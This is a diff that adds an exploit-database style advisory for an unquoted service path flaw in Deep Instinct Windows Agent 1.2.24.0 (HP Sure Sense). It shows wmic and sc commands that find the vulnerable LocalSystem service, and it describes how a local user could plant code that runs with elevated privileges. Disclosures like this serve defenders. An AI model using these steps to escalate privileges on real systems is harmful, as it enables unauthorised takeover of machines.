@@ -1,0 +1,37 @@
+# Exploit Title: Deep Instinct Windows Agent 1.2.24.0 - 'DeepNetworkService' Unquoted Service Path
+# Discovery by: Paulina Girón
+# Discovery Date: 2020-11-07
+# Vendor Homepage: https://www.deepinstinct.com/
+# Software Links : https://www.deepinstinct.com/2019/05/22/hp-collaborates-with-deep-instinct-to-roll-out-ai-powered-malware-protection-for-next-generation-hp-elitebook-and-zbook-pcs/
+# Tested Version: 1.2.24.0
+# Vulnerability Type: Unquoted Service Path
+# Tested on OS: Microsoft Windows 10 Pro 64 bits
+1)
+
+C:\> wmic service get name, pathname, displayname, startmode | findstr "Auto" | findstr /i /v "C:\Windows\\" | findstr /i "DeepNetworkService" |findstr /i /v """
+
+Deep Instinct Network Service        DeepNetworkService         C:\Program Files\HP Sure Sense\DeepNetworkService.exe 		Auto    
+
+2)
+
+C:\> sc qc "DeepNetworkService"                                                                     
+
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: DeepNetworkService
+        TIPO               : 10  WIN32_OWN_PROCESS 
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\HP Sure Sense\DeepNetworkService.exe
+        GRUPO_ORDEN_CARGA  : FSFilter Anti-Virus
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : Deep Instinct Network Service
+        DEPENDENCIAS       : 
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+
+#Description Exploit:
+# A successful attempt would require the local user to be able to insert their code in the system root path 
+# undetected by the OS or other security applications where it could potentially be executed during 
+# application startup or reboot. If successful, the local user's code would execute with the elevated 
+# privileges of the application.
